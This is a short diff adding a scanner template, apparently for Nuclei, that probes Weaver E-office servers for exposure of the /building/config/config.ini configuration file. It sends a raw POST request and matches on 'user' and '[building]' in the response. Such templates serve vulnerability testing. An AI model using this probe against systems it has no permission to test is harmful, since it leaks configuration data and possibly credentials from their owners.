@@ -1,0 +1,22 @@
+id: weaver-e-office-config-infoleak
+
+info:
+  name: 泛微 E-office config 信息泄露
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /building/config/config.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1499.61 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"user","[building]")
